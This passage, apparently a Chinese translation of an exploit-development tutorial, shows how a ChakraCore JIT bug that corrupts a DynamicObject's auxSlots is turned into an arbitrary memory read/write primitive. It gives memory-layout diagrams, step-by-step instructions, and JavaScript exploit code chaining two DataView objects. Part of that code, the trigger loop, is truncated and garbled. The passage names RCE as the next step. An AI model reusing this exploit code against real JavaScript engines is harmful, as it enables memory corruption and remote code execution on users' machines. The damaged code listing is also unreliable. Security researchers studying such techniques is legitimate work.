                                                                                                 actual
          DataView                       ArrayBuffer                                             buffer
    +---------------------+   +--->+---------------------+            RefCountedBuffer      +--->+----+
    |       vtable        |   |    |       vtable        |   +--->+---------------------+   |    |    |
    +---------------------+   |    +---------------------+   |    |       buffer        |---+    +----+
    |        type         |   |    |        type         |   |    +---------------------+   |    |    |
    +---------------------+   |    +---------------------+   |    |      refCount       |   |    +----+
    |      auxSlots       |   |    |      auxSlots       |   |    +---------------------+   |    |    |
    +---------------------+   |    +---------------------+   |                              |    +----+
    |     objectArray     |   |    |     objectArray     |   |                              |    |    |
    |- - - - - - - - - - -|   |    |- - - - - - - - - - -|   |                              |    +----+
    |      arrayFlags     |   |    |      arrayFlags     |   |                              |    |    |
    |  arrayCallSiteIndex |   |    |  arrayCallSiteIndex |   |                              |    +----+
    +---------------------+   |    +---------------------+   |                              |    |    |
    |       length        |   |    |      isDetached     |   |                              |    +----+
    +---------------------+   |    +---------------------+   |                              |    |    |
    |     arrayBuffer     |---+    |     primaryParent   |   |                              |    +----+
    +---------------------+        +---------------------+   |                              |    |    |
    |     byteOffset      |        |     otherParents    |   |                              |    +----+
    +---------------------+        +---------------------+   |                              |    |    |
    |       buffer        |---+    |     bufferContent   |---+                              |    +----+
    +---------------------+   |    +---------------------+                                  |    |    |
                              |    |     bufferLength    |                                  |    +----+
                              |    +---------------------+                                  |
                              |                                                             |
                              +-------------------------------------------------------------+
正如所示，`DataView`对象指向了`ArrayBuffer`对象。`ArrayBuffer`指向了前面提到的`RefCountedBuffer`对象，后者又指向了内存中的实际数据缓冲区。然而，观察到`DataView`对象也指向了实际数据缓冲区。如果我们覆写`DataView`对象的缓冲区字段为我们的指针，我们则会根据所需得到所需的绝对读写原语。我们的障碍只剩问题3了——我们无法用已被破坏的`DynamicObject`来在内存中写入普通数字（被标记的数字…）。但现在，由于`DataView`对象允许我们在其指向的缓冲区内写入普通数字（详细信息可参考DataView
“API”
）。再次受到Bruno的启发，我们有两个`DataView`对象，其中第一个指向第二个，至此我们清楚地知道下一步的破坏方式。这将解决最后一个问题，并且给予我们想要的绝对读写原语。
让我们回看整个漏洞利用过程。可以参考下面的说明（省略了我们不关心的对象）
           o                  obj                     DataView #1 - dv1                   DataView #2 - dv2
    +--------------+ +->+--------------+        +->+---------------------+          +->+---------------------+  +--> 0x????
    |    vtable    | |  |    vtable    | //o.a  |  |       vtable        | //obj.a  |  |       vtable        |  |       
    +--------------+ |  +--------------+        |  +---------------------+          |  +---------------------+  |       
    |     type     | |  |     type     | //o.b  |  |        type         | //obj.b  |  |        type         |  |       
    +--------------+ |  +--------------+        |  +---------------------+          |  +---------------------+  |       
    |   auxSlots   +-+  |   auxSlots   +-//o.c--+  |      auxSlots       | //obj.c  |  |      auxSlots       |  |       
    +--------------+    +--------------+           +---------------------+          |  +---------------------+  |       
    |  objectArray |    |  objectArray |           |     objectArray     | //obj.d  |  |     objectArray     |  |       
    +--------------+    +--------------+           |- - - - - - - - - - -|          |  |- - - - - - - - - - -|  |       
                                                   |      arrayFlags     |          |  |      arrayFlags     |  |       
                                                   |  arrayCallSiteIndex |          |  |  arrayCallSiteIndex |  |       
                                                   +---------------------+          |  +---------------------+  |       
                                                   |       length        | //obj.e  |  |       length        |  |       
                                                   +---------------------+          |  +---------------------+  |       
                                                   |     arrayBuffer     | //obj.f  |  |     arrayBuffer     |  |       
                                                   +---------------------+          |  +---------------------+  |       
                                                   |     byteOffset      | //obj.g  |  |     byteOffset      |  |       
                                                   +---------------------+          |  +---------------------+  |       
                                                   |       buffer        |-//obj.h--+  |       buffer        |--+//dv1.setInt32(0x38,0x??,true);
                                                   +---------------------+             +---------------------+   //dv1.setInt32(0x3C,0x??,true);
  1. 触发漏洞将`'o'auxSlots`设置为`'obj'(opt(o, cons, obj);)`
  2. 用`o`将`obj`设置为第一个`DataView (o.c = dv1;)`
  3. 用`obj`设置第一个`DataView（'dv1'）`缓冲区字段为第二个`DataView`对象(`obj.h = dv2;`)
  4. 用第一个`DataView`对象`dv1`来准确地将第二个`DataView`对象`dv2`的缓冲区字段设置为我们选择的地址（`dv1.setUint32(0x38, 0xDEADBEEF, true); dv1.setUint32(0x3C, 0xDEADBEEF, true);`）。注意我们是如何将选择的地址（0xDEADBEEFDEADBEEF）写入`dv2`缓冲区字段的精确偏移处（0x38）。
  5. 用第二个`DataView`对象`dv2`来读写我们选择的地址（`dv2.getUint32(0, true); dv2.getUint32(4, true);`）  
重复执行步骤4和5来执行我们的读写操作。
下面就是完全读写原语的代码：
    // commit 331aa3931ab69ca2bd64f7e020165e693b8030b5
    obj = {}
    obj.a = 1;
    obj.b = 2;
    obj.c = 3;
    obj.d = 4;
    obj.e = 5;
    obj.f = 6;
    obj.g = 7;
    obj.h = 8;
    obj.i = 9;
    obj.j = 10;
    dv1 = new DataView(new ArrayBuffer(0x100));
    dv2 = new DataView(new ArrayBuffer(0x100));
    BASE = 0x100000000;
    function hex(x) {
        return "0x" + x.toString(16);
    }
    function opt(o, c, value) {
        o.b = 1;
        class A extends c {}
        o.a = value;
    }
    function main() {
        for (let i = 0; i auxSlots = obj (Step 1)
        o.c = dv1; // obj->auxSlots = dv1 (Step 2)
        obj.h = dv2; // dv1->buffer = dv2 (Step 3)
        let read64 = function(addr_lo, addr_hi) {
            // dv2->buffer = addr (Step 4)
            dv1.setUint32(0x38, addr_lo, true);
            dv1.setUint32(0x3C, addr_hi, true);
            // read from addr (Step 5)
            return dv2.getInt32(0, true) + dv2.getInt32(4, true) * BASE;
        }
        let write64 = function(addr_lo, addr_hi, value_lo, value_hi) {
            // dv2->buffer = addr (Step 4)
            dv1.setUint32(0x38, addr_lo, true);
            dv1.setUint32(0x3C, addr_hi, true);
            // write to addr (Step 5)
            dv2.setInt32(0, value_lo, true);
            dv2.setInt32(0, value_hi, true);
        }
        // get dv2 vtable pointer
        vtable_lo = dv1.getUint32(0, true);
        vtable_hi = dv1.getUint32(4, true);
        print(hex(vtable_lo + vtable_hi * BASE));
        // read first vtable entry using the RW primitive
        print(hex(read64(vtable_lo, vtable_hi)));
        // write a value to address 0x1111111122222222 using the RW primitive (this will crash)
        write64(0x22222222, 0x11111111, 0x1337, 0x1337);
    }
    main();
注意：如果想要调试自己的代码（例如WinDBG），一个很便捷的方法就是使用”instruments”来断在感兴趣的JS代码处。可参考一下两条有用的建议：
  * 在`ch!WScriptJsrt::EchoCallback`设置断点从而阻止`print()`调用
  * 在`chakracore!Js::DynamicTypeHandler::SetSlotUnchecked`设置断点，阻止解释器执行的`DynamicObject`属性赋值操作。这对于查看javascript对象（`o`和`obj`）如何破坏内存中的其他对象很有帮助。
将两者任意结合起来可以轻松定位利用代码。
## 总结
我们已经见识了如何利用`DynamicObject`的`auxSlots`的JIT破坏来最终获得完全读写原语。我们利用损坏的对象进一步破坏其他感兴趣的对象。——特别是两个`DataView`对象，前一个精确地破坏了第二个，从而控制原语地址的选择。我们不得不绕过
javascript’s DynamicObject “API”
中的一些限制。最后，请注意，获得完全读写原语仅仅此漏洞利用的第一步。攻击者仍然需要重定向程序执行流程来获得完成的RCE。但是，这些内容超出了本文章的范畴，可以留给读者自行练习。